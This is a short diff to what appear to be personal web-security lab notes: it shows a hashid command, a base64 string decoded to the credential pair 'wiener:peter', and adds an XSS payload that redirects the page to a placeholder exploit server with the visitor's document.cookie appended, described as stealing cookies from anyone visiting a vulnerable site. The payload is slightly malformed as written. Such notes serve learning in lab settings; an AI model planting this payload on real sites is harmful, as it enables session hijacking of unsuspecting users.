@@ -450,3 +450,7 @@ To crack the hash using **Hashcat**, you first need to identify the hash type.
 - `hashid 51dc30ddc473d43a6011e9ebba6ca770`
 
 this d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw  is wiener:peter
+
+xss payload: 
+  <script>document.location"https://exploit-server-link"+document.cookie</script>
+(this extract the cookie of any user who visit xss vulnerable sites(post, blog etc) and send it to attackers server)
